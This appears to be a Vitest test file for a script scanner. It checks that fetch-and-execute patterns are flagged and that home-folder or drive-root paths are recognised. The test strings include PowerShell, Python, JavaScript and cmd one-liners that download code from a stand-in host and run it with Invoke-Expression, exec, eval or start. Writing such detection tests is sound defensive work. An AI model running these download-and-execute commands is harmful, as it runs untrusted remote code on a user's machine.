import { describe, expect, it } from "vitest";
import { isHomeOrRoot } from "../src/checks/mode.ts";
import { findExecInScript } from "../src/patterns.ts";

describe("Windows scripts", () => {
  it.each([
    ["PowerShell fetch into a variable, then Invoke-Expression", "$code = Invoke-RestMethod https://x.example/a.ps1\nInvoke-Expression $code\n"],
    ["PowerShell scriptblock from fetched text", "$t = (iwr https://x.example/a).Content\n& ([scriptblock]::Create($t))\n"],
    ["Python requests then exec", "import requests\nresp = requests.get('https://x.example/a.py')\ncode = resp.text\nexec(compile(code, 'a', 'exec'))\n"],
    ["Python urlopen then exec", "from urllib.request import urlopen\nsrc = urlopen('https://x.example/a').read()\nexec(src)\n"],
    ["JS fetch then eval", "const r = await fetch('https://x.example/a.js');\nconst body = await r.text();\neval(body);\n"],
    ["PowerShell -OutFile then run by path", "$p = \"$env:TEMP\t.exe\"\nInvoke-WebRequest https://x.example/t.exe -OutFile $env:TEMP\t.exe\n& $env:TEMP\t.exe\n"],
    ["cmd curl -o then start", "@echo off\ncurl -L -o %TEMP%\setup.exe https://x.example/s.exe\nstart \"\" \"%TEMP%\setup.exe\"\n"],
  ])("flags %s", (_name, text) => {
    expect(findExecInScript(text).length).toBeGreaterThan(0);
  });

  it.each([
    ["fetched JSON parsed, not run", "import json, requests\ndata = requests.get('https://x.example/a.json').json()\nprint(json.dumps(data))\n"],
    ["download only", "Invoke-WebRequest https://x.example/r.zip -OutFile r.zip\nExpand-Archive r.zip\n"],
    ["exec of a local string", "code = 'print(1)'\nexec(code)\n"],
    ["Invoke-Expression of a local string", "$c = 'Get-Date'\nInvoke-Expression $c\n"],
  ])("leaves alone %s", (_name, text) => {
    expect(findExecInScript(text)).toEqual([]);
  });
});

describe("home folder written as a variable", () => {
  const home = "C:/Users/user";
  it.each(["%USERPROFILE%", "%USERPROFILE%\\", "$env:USERPROFILE", "${HOME}", "$HOME/", "%HOMEDRIVE%%HOMEPATH%", String.raw`C:\Users\user`, "C:\\", "D:", "~"])(
    "%s is home or a drive",
    (p) => expect(isHomeOrRoot(p, home)).toBe(true),
  );
  it.each([String.raw`%USERPROFILE%\src\app`, String.raw`$env:USERPROFILE\docs`, String.raw`C:\Users\user\project`, "", "./lib"])("%s is not", (p) =>
    expect(isHomeOrRoot(p, home)).toBe(false),
  );
});
